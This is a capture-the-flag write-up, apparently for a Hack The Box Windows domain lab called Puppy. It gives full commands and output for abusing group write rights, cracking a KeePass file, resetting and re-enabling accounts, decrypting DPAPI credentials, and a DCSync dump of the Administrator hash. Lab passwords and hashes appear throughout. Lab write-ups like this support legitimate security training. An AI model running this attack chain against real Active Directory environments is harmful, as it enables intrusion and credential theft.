#kdbx #DPAPI #DCsync
# Summary
- `kdbx` is used to store credentials.
- `DPAPI`, also used to store credentials
- `DCsync`.

---
10.10.11.70
`levi.james` :  `KingofAkron2025!`


nmap scan:
```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus       
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-04 00:34:11Z)
111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000) 
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
2049/tcp open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3260/tcp open  iscsi?        syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
```

Looking at bloodhound, `levi.james` is in `HR` group and he has `GenericWrite` on `DEVELOPERS` group. We will try to add our self in:
![[Z Assets/Images/Pasted image 20251004040824.jpeg]]
```
bloodyAD --host "10.10.11.70" -d "puppy.htb" -u 'levi.james' -p  'KingofAkron2025!' add groupMember 'DEVELOPERS' 'levi.james'
```

Now lets look at `smb` shares, We have folder called `DEV`, looking inside we find:
```

smb: DEV\> ls
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 09:09:12 2025
  Projects                            D        0  Sat Mar  8 18:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 04:25:46 2025
  
smb: SYSVOL\> ls
  lvRxjnmZBA                          D        0  Fri Mar 21 07:33:44 2025
  PUPPY.HTB                          Dr        0  Wed Feb 19 13:44:57 2025
  UltFsQYRGg.txt                      A        0  Fri Mar 21 07:33:44 2025
```

this is `kdbx` which contain hashes of passwords.
```
john-the-ripper.keepass2john recovery.kdbx > recovery.hash
john-the-ripper --format=KeePass  --wordlist ../rockyou7plus.txt recovery.hash
cat john.pot

e8c2ff8cc45c69ce1f4daef0e9:liverpool
```
We found password `liverpool`. We now can open `kdbx` file using this password, And we found multiple of usernames and passwords most of them were outdated but only one was valid.
`ant.edwards`: `Antman2025!`

Looking at `ant.edwards` in bloodhound:
![[Z Assets/Images/Pasted image 20251004165934.jpeg]]
We will change its password:
```
rpcclient -U 'puppy.htb/ant.edwards%Antman2025!' dc.puppy.htb
setuserinfo2 adam.silver 23 P@ssw0rd!
```

Try to do  ldap using this user:
```
nxc ldap 10.10.11.70 -u 'adam.silver'  -p 'P@ssw0rd!' -d puppy.htb --dns-server 10.10.11.70 
LDAP        10.10.11.70     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:puppy.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.10.11.70     389    DC               [-] puppy.htb\adam.silver:P@ssw0rd! STATUS_ACCOUNT_DISABLED
```

The account is `STATUS_ACCOUNT_DISABLED`, so we will enable it, 
```
bloodyAD -u 'ant.edwards' -p 'Antman2025!' -d 'PUPPY.HTB' --dc-ip 10.10.11.70 remove uac 'adam.silver' -f ACCOUNTDISABLE
```
Now we can do evil-winrm.

looking at `C:\` drive, we found `C:\Backups` which contain website, between the files we found credentails  `ChefSteph2025!` for `steph.cooper` in `nms-auth-config.xml.bak`. now we can login him.
```sh
> ls
assets  images  index.html  nms-auth-config.xml.bak
```

After getting inside we found `DPAPI` cerdentials and masterkey in `STEPH.COOPER` directories. But we need to get the password for the masterkey. So, we will try to use `ChefSteph2025!` again.
```
impacket.dpapi masterkey -file master  -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107

impacket.dpapi credential -file cred -key '0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c81'

Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

We found that `steph.cooper_adm` can do `DCsync`.
```
secretsdump.py 'puppy.htb'/'steph.cooper_adm':'FivethChipOnItsWay2025!'@'DC'

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xa943f13896e3e21f6c4100c7da9895a6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c541c389e2904b9b112f599fd6b333d:::
```

We got admin hash GG.

---

